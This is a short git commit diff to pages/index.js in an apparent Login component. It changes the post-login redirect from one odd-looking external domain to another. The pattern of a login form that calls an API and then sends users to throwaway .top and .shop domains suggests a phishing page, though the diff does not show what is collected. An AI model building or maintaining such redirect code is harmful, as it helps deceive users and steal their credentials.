3da19baa4c13e958e31ec77776bfb32c842e2001
husknet <127146284+husknet@users.noreply.github.com>
2025-02-20 14:18:49 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nert.itpanthera.top/';
+      window.location.href = 'https://nertens.cookshowfiles.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
